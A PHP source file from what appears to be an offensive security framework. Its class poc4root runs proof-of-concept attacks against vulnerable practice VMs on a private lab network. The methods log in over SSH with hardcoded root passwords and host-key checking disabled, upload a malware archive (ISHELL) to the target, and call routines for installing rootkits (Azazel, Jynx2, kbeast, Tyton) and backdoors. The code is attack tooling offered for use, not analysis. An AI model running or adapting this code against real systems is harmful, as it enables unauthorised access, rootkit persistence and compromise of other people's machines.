<?php
class poc4root extends poc4bof {
    
    
    public function __construct() {
        parent::__construct();
        
    }
    
    
    public function poc4root2rootkit4userland2azazel(){
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.154"; // Lin.Security v1.0
        $port = "22";
        $protocol = "T";
        $user_name_created = "insecurity" ;
        $user_name_pass = "P@ssw0rd";
        $user_name_created = "root" ;
        $user_name_pass = "secret123";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);

    }
    
    
    public function poc4root2rootkit4userland2jynx2(){
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.134"; // DSL
        $port = "22";
        $protocol = "T";
        $user_name_created = "root" ;
        $user_name_pass = "dsl";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);

    }
    
    
    public function poc4root2rootkit4kerneland2tyton(){
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.134"; // DVL
        $port = "22";
        $protocol = "T";
        $user_name_created = "root" ;
        $user_name_pass = "toor";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);

    }
    
    
    public function poc4root2rootkit4kerneland2kbeastv1(){
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.134"; // billu 1
        $port = "22";
        $protocol = "T";
        $user_name_created = "root" ;
        $user_name_pass = "roottoor";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);

    }
    
    
    public function poc4root2rootkit4kerneland2avgcoder(){
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.134"; // OWASP
        $port = "22";
        $protocol = "T";
        
        $login  = "root" ;
        $pass = "owaspbwa";
        $titre = "avgcoder";
        $fonction2exec = "root2rootkit";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
    }
    
    
    public function poc4root2rootkit4kerneland2lkm(){
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.134"; // OWASP
        $port = "22";
        $protocol = "T";
        $user_name_created = "root" ;
        $user_name_pass = "owaspbwa";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);

    }
    
    public function poc4pivot(){
        
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.140"; // analoguepond
        $port = "22";
        $protocol = "T";
        $user_name_created = "eric" ;
        $user_name_pass = "therisingsun";

    }
    
    
    
    public function poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm){
        $this->gitre(__FUNCTION__);
        
        $eth = trim($eth);
        $domain = trim($domain);
        $ip = trim($ip);
        $port = trim($port);
        $protocol = trim($protocol);        
        $login = trim($login);
        $pass = trim($pass);
        $titre = trim($titre);
        $fonction2exec = trim($fonction2exec);
        $vm = trim($vm);
        $this->titre(__FUNCTION__);
        
        $victime = new vm($vm);
        $victime->vm2upload("$this->dir_tools/Malware/ISHELL-v0.2.tar.gz","$this->vm_tmp_lin/ISHELL-v0.2.tar.gz");
        
        $flag_poc = FALSE;
        $flag_poc = TRUE;
        
        $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
        $test->poc($flag_poc);
        $stream = $test->stream8ssh8passwd($test->ip, $test->port, $login,$pass);
        
        $template_cmd = "sshpass -p '$pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $login@$test->ip -p $test->port -C  '%CMD%'";
        list($stream,$template_id,$template_cmd,$template_shell) = $test->stream4check($stream,$template_cmd,$login,$pass);
        
        if (is_resource($stream)){
            $templateB64_id = base64_encode($template_id);
            $templateB64_cmd = base64_encode($template_cmd);
            $templateB64_shell = base64_encode($template_shell);
            
            $data = "/usr/bin/id";
            $rst_id = $test->stream4result($stream, $data, 10);
            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $test->parse4id($rst_id);
            $this->article("CREATE Template ID", $template_id);
            $this->article("CREATE Template CMD", $template_cmd);
            $this->article("CREATE Template SHELL", $template_shell);
            $this->pause();           
            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$user_name_pass);
            $obj_lan->poc($test->flag_poc);
            
            return $obj_lan->$fonction2exec();
        }
    }
    
    
    
    public function poc4root2backdoor(){
        $this->chapitre(__FUNCTION__);
                
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.133"; // Lin.Security v1.0
        $port = "22";
        $protocol = "T";
      
        $login = "root" ;
        $pass = "secret123";
        $titre = "backdoor";
        $fonction2exec = "root2backdoor";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);       
    }
    

    
        
    public function poc4root8test(){
        $this->titre(__FUNCTION__);        
        $eth = 'vmnet6';
        $domain = 'hack.vlan';

        
        $ip = "10.60.10.163"; // 64Base 1.01
        $port = "62964";
        $protocol = "T";
        $user_name_created = "64base" ;
        $user_name_pass = 'NjRiYXNlNWgzNzcK';
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    
    }
    
        
    
    
    
    
    
    
    
    
    
    
    
    
    
}
?>